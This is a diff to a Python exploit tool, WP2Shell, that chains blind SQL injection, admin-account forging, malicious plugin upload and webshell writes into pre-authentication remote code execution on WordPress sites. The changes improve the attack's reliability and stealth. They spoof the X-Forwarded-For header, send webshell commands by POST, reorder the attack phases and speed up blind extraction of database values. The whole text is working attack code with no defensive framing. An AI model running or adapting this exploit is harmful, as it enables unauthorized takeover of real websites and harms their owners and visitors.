@@ -105,6 +105,7 @@ class WP2Shell:
                            'AppleWebKit/537.36 (KHTML, like Gecko) '
                            'Chrome/127.0.0.0 Safari/537.36'),
             'Accept': 'application/json',
+            'X-Forwarded-For': '127.0.0.1',
         })
         if proxy:
             self.s.proxies = {"http": proxy, "https": proxy}
@@ -766,8 +767,8 @@ class WP2Shell:
 
             check_url = self.target + url_path
             try:
-                r = self.s.get(check_url,
-                               params={"k": shell_key,
+                r = self.s.post(check_url,
+                               data={"k": shell_key,
                                        "c": "echo wp2shell_ok"},
                                timeout=10)
                 if "wp2shell_ok" in r.text:
@@ -852,18 +853,20 @@ class WP2Shell:
             except Exception:
                 continue
 
-            # Verify the shell
+            # Verify the shell (must be HTTP 200 + contain expected output)
             check_url = self.target + url_path
             try:
-                r = self.s.get(check_url,
-                               params={"k": shell_key, "c": "echo wp2shell_ok"},
+                r = self.s.post(check_url,
+                               data={"k": shell_key, "c": "echo wp2shell_ok"},
                                timeout=10)
-                if "wp2shell_ok" in r.text:
+                if r.status_code == 200 and "wp2shell_ok" in r.text:
                     self.shell_url = check_url
                     self.shell_key = shell_key
                     log(f"UNION OUTFILE webshell deployed!", "+")
                     log(f"Shell: {check_url}", "+")
                     return True
+                vlog(f"  OUTFILE verify: HTTP {r.status_code}, "
+                     f"body={r.text[:80]}", self.verbose)
             except Exception:
                 continue
 
@@ -901,13 +904,18 @@ class WP2Shell:
             "testcookie": "1",
         }
         self.s.cookies.set("wordpress_test_cookie", "WP+Cookie+check")
-        r = self.s.post(login_url, data=data, timeout=self.timeout,
-                        allow_redirects=False)
+        try:
+            r = self.s.post(login_url, data=data, timeout=self.timeout,
+                            allow_redirects=False)
+        except requests.exceptions.Timeout:
+            log("Login request timed out", "-")
+            return False
         if r.status_code in (302, 303):
             loc = r.headers.get('Location', '')
             if 'wp-admin' in loc and 'login' not in loc.lower():
+                # 302 to wp-admin confirms success; skip following the
+                # redirect (Location may point to an unreachable domain).
                 log("Authenticated as admin", "+")
-                self.s.get(loc, timeout=self.timeout)
                 return True
         log("Login failed", "-")
         return False
@@ -934,9 +942,35 @@ class WP2Shell:
                 plugin_php)
         buf.seek(0)
 
+        # Helper: GET with same-domain redirect only + timeout guard.
+        # Blocks cross-domain redirects (e.g. IP→real-hostname) that
+        # would hang on unreachable domains.
+        def _safe_get(url, timeout=None, _depth=0):
+            if _depth > 5:
+                return None
+            try:
+                r = self.s.get(url,
+                               timeout=timeout or self.timeout,
+                               allow_redirects=False)
+            except (requests.exceptions.Timeout,
+                    requests.exceptions.ConnectionError):
+                return None
+            if r.status_code in (301, 302, 303, 307, 308):
+                loc = r.headers.get("Location", "")
+                # Only follow if redirect stays on the same host
+                if loc and urlparse(loc).netloc == urlparse(url).netloc:
+                    return _safe_get(loc, timeout, _depth + 1)
+                elif loc and urlparse(loc).netloc == urlparse(
+                        self.target).netloc:
+                    return _safe_get(loc, timeout, _depth + 1)
+                # Cross-domain redirect → ignore, return current response
+            return r
+
         for page in ["/wp-admin/plugin-install.php",
                      "/wp-admin/update.php?action=upload-plugin"]:
-            r = self.s.get(self.target + page, timeout=self.timeout)
+            r = _safe_get(self.target + page)
+            if r is None or r.status_code not in (200, 302):
+                continue
             m = re.search(r'name="_wpnonce"\s+value="([^"]+)"', r.text)
             if m:
                 break
@@ -949,33 +983,39 @@ class WP2Shell:
 
         upload_url = (self.target +
                       "/wp-admin/update.php?action=upload-plugin")
-        r = self.s.post(
-            upload_url,
-            data={"_wpnonce": nonce, "install-plugin-submit": "Install Now"},
-            files={"pluginzip": (f"{self.SHELL_PLUGIN}.zip",
-                                 buf, "application/zip")},
-            timeout=self.timeout,
-        )
+        try:
+            r = self.s.post(
+                upload_url,
+                data={"_wpnonce": nonce,
+                      "install-plugin-submit": "Install Now"},
+                files={"pluginzip": (f"{self.SHELL_PLUGIN}.zip",
+                                     buf, "application/zip")},
+                timeout=self.timeout,
+            )
+        except (requests.exceptions.Timeout,
+                requests.exceptions.ConnectionError):
+            log("Plugin upload request failed (network)", "-")
+            return False
 
         if "successfully" in r.text.lower() or self.SHELL_PLUGIN in r.text:
             log("Plugin uploaded", "+")
         else:
             log("Plugin upload may have failed, checking...", "!")
 
-        r = self.s.get(self.target + "/wp-admin/plugins.php",
-                       timeout=self.timeout)
-        act_m = re.search(
-            rf'action=activate&amp;plugin='
-            rf'({re.escape(self.SHELL_PLUGIN)}[^"&]+)'
-            rf'&amp;_wpnonce=([a-f0-9]+)', r.text)
+        r = _safe_get(self.target + "/wp-admin/plugins.php")
+        act_m = None
+        if r and r.status_code == 200:
+            act_m = re.search(
+                rf'action=activate&amp;plugin='
+                rf'({re.escape(self.SHELL_PLUGIN)}[^"&]+)'
+                rf'&amp;_wpnonce=([a-f0-9]+)', r.text)
         if act_m:
             plugin_file = act_m.group(1).replace('&amp;', '&')
             act_nonce = act_m.group(2)
-            self.s.get(
+            _safe_get(
                 f"{self.target}/wp-admin/plugins.php?"
                 f"action=activate&plugin={plugin_file}"
-                f"&_wpnonce={act_nonce}",
-                timeout=self.timeout)
+                f"&_wpnonce={act_nonce}")
             log("Plugin activated", "+")
 
         shell_url = (f"{self.target}/wp-content/plugins/"
@@ -983,10 +1023,10 @@ class WP2Shell:
         test_payload = base64.b64encode(
             b"echo 'wp2shell_ok';").decode()
         try:
-            r = self.s.get(shell_url,
-                           params={"k": shell_key, "c": test_payload},
+            r = self.s.post(shell_url,
+                           data={"k": shell_key, "c": test_payload},
                            timeout=10)
-            if "wp2shell_ok" in r.text:
+            if r.status_code == 200 and "wp2shell_ok" in r.text:
                 self.shell_url = shell_url
                 self.shell_key = shell_key
                 log(f"Webshell verified at {shell_url}", "+")
@@ -1149,55 +1189,118 @@ class WP2Shell:
         self._batch(outer, extra_timeout=15)
         return token, embed_urls
 
-    def _recover_table_prefix(self):
-        """Blind-extract wp_posts table name and existing admin ID."""
+    def _recover_table_prefix(self, posts_table_default="wp_posts"):
+        """Blind-extract or default wp_posts table name and admin ID.
+
+        Tries the default 'wp_posts' first via a fast EXISTS check.
+        Only falls back to blind extraction if the default fails.
+        """
         log("Extracting table prefix and admin user ID...")
-        posts_table = self._extract_string(
-            "SELECT TABLE_NAME FROM information_schema.TABLES "
-            "WHERE TABLE_SCHEMA=DATABASE() "
-            "AND TABLE_NAME LIKE '%posts' LIMIT 1",
-            label="posts_table", max_len=40,
-        )
-        if not posts_table:
-            raise RuntimeError("could not determine posts table name")
+        posts_table = posts_table_default
+        # Quick verify: does the default table exist?
+        exists = self._sqli_bool(
+            f"EXISTS(SELECT 1 FROM information_schema.TABLES "
+            f"WHERE TABLE_SCHEMA=DATABASE() "
+            f"AND TABLE_NAME='{posts_table}')")
+        if not exists:
+            log(f"Default '{posts_table}' not found, blind-extracting...", "!")
+            posts_table = self._extract_string(
+                "SELECT TABLE_NAME FROM information_schema.TABLES "
+                "WHERE TABLE_SCHEMA=DATABASE() "
+                "AND TABLE_NAME LIKE '%posts' LIMIT 1",
+                label="posts_table", max_len=40,
+            )
+            if not posts_table:
+                raise RuntimeError("could not determine posts table name")
+        else:
+            log(f"posts_table: {posts_table} (default, verified)", "+")
         # Update table prefix from posts table name
         self.tp = posts_table[:-5]  # strip 'posts' suffix
 
-        admin_id = self._extract_string(
-            f"SELECT u.ID FROM {self.tp}users u "
+        # admin_id: default to 1 (first admin), verify with EXISTS
+        admin_id = 1
+        cap_hex = self._sql_hex(self.tp + "capabilities")
+        admin_hex = self._sql_hex('s:13:"administrator";b:1;')
+        is_admin1 = self._sqli_bool(
+            f"EXISTS(SELECT 1 FROM {self.tp}users u "
             f"JOIN {self.tp}usermeta m ON m.user_id=u.ID "
-            f"WHERE m.meta_key=0x"
-            f"{(self.tp + 'capabilities').encode().hex()} "
-            "AND INSTR(m.meta_value,"
-            + self._sql_hex('s:13:"administrator";b:1;')
-            + ")>0 ORDER BY u.ID LIMIT 1",
-            label="admin_id", max_len=8,
-        )
-        if not admin_id or not admin_id.isdigit():
-            raise RuntimeError("could not locate an existing admin user")
+            f"WHERE u.ID=1 AND m.meta_key={cap_hex} "
+            f"AND INSTR(m.meta_value,{admin_hex})>0)")
+        if is_admin1:
+            log(f"admin_id: 1 (default, verified)", "+")
+        else:
+            log("Admin ID 1 not found, blind-extracting...", "!")
+            admin_id = self._extract_string(
+                f"SELECT u.ID FROM {self.tp}users u "
+                f"JOIN {self.tp}usermeta m ON m.user_id=u.ID "
+                f"WHERE m.meta_key={cap_hex} "
+                f"AND INSTR(m.meta_value,{admin_hex})>0 "
+                f"ORDER BY u.ID LIMIT 1",
+                label="admin_id", max_len=8,
+            )
+            if not admin_id or not admin_id.isdigit():
+                raise RuntimeError("could not locate an existing admin user")
         log(f"Posts table: {posts_table}, admin ID: {admin_id}", "+")
         return posts_table, int(admin_id)
 
     def _recover_cache_post_ids(self, posts_table, embed_urls):
-        """Blind-extract the database IDs of the 3 oembed_cache posts."""
+        """Blind-extract the cache post IDs; use neighbor-guessing after
+        the first ID is found (oEmbed posts are created sequentially)."""
         log("Recovering oEmbed cache post IDs...")
         embed_size = ('a:2:{s:5:"width";s:3:"500";'
                       's:6:"height";s:3:"750";}')
         cache_ids = []
-        for idx, embed_url in enumerate(embed_urls):
+
+        def _verify_cache_id(pid, embed_url):
+            """Check if post ID *pid* is the oembed_cache for *embed_url*."""
             cache_key = hashlib.md5(
                 (embed_url + embed_size).encode()).hexdigest()
-            pid = self._extract_string(
-                f"SELECT ID FROM {posts_table} "
+            return self._sqli_bool(
+                f"EXISTS(SELECT 1 FROM {posts_table} "
                 "WHERE post_type=0x6f656d6265645f6361636865 "
-                f"AND post_name=0x{cache_key.encode().hex()} "
-                "ORDER BY ID DESC LIMIT 1",
-                label=f"cache_id[{idx}]", max_len=8,
-            )
-            if not pid or not pid.isdigit() or int(pid) < 1:
-                raise RuntimeError(
-                    f"could not recover oEmbed cache post {idx}")
-            cache_ids.append(int(pid))
+                f"AND ID={pid} "
+                f"AND post_name=0x{cache_key.encode().hex()})")
+
+        # Extract first cache ID
+        embed_url = embed_urls[0]
+        cache_key = hashlib.md5(
+            (embed_url + embed_size).encode()).hexdigest()
+        pid0 = self._extract_string(
+            f"SELECT ID FROM {posts_table} "
+            "WHERE post_type=0x6f656d6265645f6361636865 "
+            f"AND post_name=0x{cache_key.encode().hex()} "
+            "ORDER BY ID DESC LIMIT 1",
+            label="cache_id[0]", max_len=8,
+        )
+        if not pid0 or not pid0.isdigit() or int(pid0) < 1:
+            raise RuntimeError("could not recover oEmbed cache post 0")
+        cache_ids.append(int(pid0))
+
+        # Neighbor-guess: cache posts are sequential → try +1, +2
+        for offset in (1, 2):
+            idx = len(cache_ids)
+            guessed = cache_ids[0] + offset
+            embed_url = embed_urls[idx]
+            if _verify_cache_id(guessed, embed_url):
+                cache_ids.append(guessed)
+                log(f"  cache_id[{idx}]: {guessed} (neighbor-guessed, "
+                    f"verified)", "+")
+            else:
+                # Fall back to blind extraction
+                cache_key = hashlib.md5(
+                    (embed_url + embed_size).encode()).hexdigest()
+                pid = self._extract_string(
+                    f"SELECT ID FROM {posts_table} "
+                    "WHERE post_type=0x6f656d6265645f6361636865 "
+                    f"AND post_name=0x{cache_key.encode().hex()} "
+                    "ORDER BY ID DESC LIMIT 1",
+                    label=f"cache_id[{idx}]", max_len=8,
+                )
+                if not pid or not pid.isdigit() or int(pid) < 1:
+                    raise RuntimeError(
+                        f"could not recover oEmbed cache post {idx}")
+                cache_ids.append(int(pid))
+
         log(f"Cache post IDs: {cache_ids}", "+")
         return cache_ids
 
@@ -1434,15 +1537,15 @@ class WP2Shell:
                 skip_create_admin=False, skip_union_outfile=False):
         """Full pre-auth RCE chain.
 
-        Tries the fastest RCE path first, falling back through
-        progressively slower methods:
+        Tries the most reliable RCE path first, falling back through
+        progressively less likely methods:
 
-          3a  UNION SELECT INTO OUTFILE → direct webshell write
-              (fastest; needs MySQL FILE priv + writable webroot)
-          3b  Stacked INSERT → create admin → login → plugin upload
-              (needs multi_query support, rare)
-          3c  Subquery INTO OUTFILE → direct webshell write
-              (legacy; needs FILE priv + permissive secure_file_priv)
+          3a  Changeset-forging admin creation → login → plugin upload
+              (most reliable; works on all default configs, ~2 min)
+          3b  UNION SELECT INTO OUTFILE → direct webshell write
+              (needs MySQL FILE priv + writable webroot; unreliable)
+          3c  Legacy subquery INTO OUTFILE
+              (needs FILE priv + permissive secure_file_priv)
           3d  Blind extraction of existing admin + hash crack
               (slow but works on any vulnerable instance)
         """
@@ -1477,18 +1580,9 @@ class WP2Shell:
             return False
         print()
 
-        # -- Phase 3a: UNION SELECT INTO OUTFILE (fastest, need FILE priv) --
-        if not skip_union_outfile:
-            log("Phase 3a: UNION SELECT INTO OUTFILE")
-            if self._try_union_outfile(webroot, shell_key):
-                print()
-                self._interactive_shell()
-                return True
-            print()
-
-        # -- Phase 3b: Changeset-forging admin creation (no multi_query needed) --
+        # -- Phase 3a: Changeset-forging admin creation (most reliable) --
         if not skip_create_admin:
-            log("Phase 3b: Changeset-forging admin creation")
+            log("Phase 3a: Changeset-forging admin creation")
             if self._changeset_create_admin(admin_user, admin_pass):
                 print()
                 self._upload_shell_plugin(shell_key)
@@ -1504,6 +1598,15 @@ class WP2Shell:
                     self._interactive_shell()
                     return True
                 return False
+            print()
+
+        # -- Phase 3b: UNION SELECT INTO OUTFILE (needs FILE priv, unreliable) --
+        if not skip_union_outfile:
+            log("Phase 3b: UNION SELECT INTO OUTFILE")
+            if self._try_union_outfile(webroot, shell_key):
+                print()
+                self._interactive_shell()
+                return True
             print()
 
         # -- Phase 3c: Legacy subquery OUTFILE (FILE priv + writable dir) --
@@ -1631,9 +1734,9 @@ class WP2Shell:
                 f"echo shell_exec('{cmd}');".encode()
             ).decode()
             try:
-                r = self.s.get(
+                r = self.s.post(
                     self.shell_url,
-                    params={"k": self.shell_key, "c": b64cmd},
+                    data={"k": self.shell_key, "c": b64cmd},
                     timeout=self.timeout)
                 output = r.text.strip()
                 if output:
@@ -1677,8 +1780,8 @@ class WP2Shell:
             rm_payload = base64.b64encode(
                 b"unlink(__FILE__); rmdir(dirname(__FILE__));").decode()
             try:
-                self.s.get(shell_url,
-                           params={"k": shell_key, "c": rm_payload},
+                self.s.post(shell_url,
+                           data={"k": shell_key, "c": rm_payload},
                            timeout=10)
                 log("Shell files removed", "+")
             except Exception:
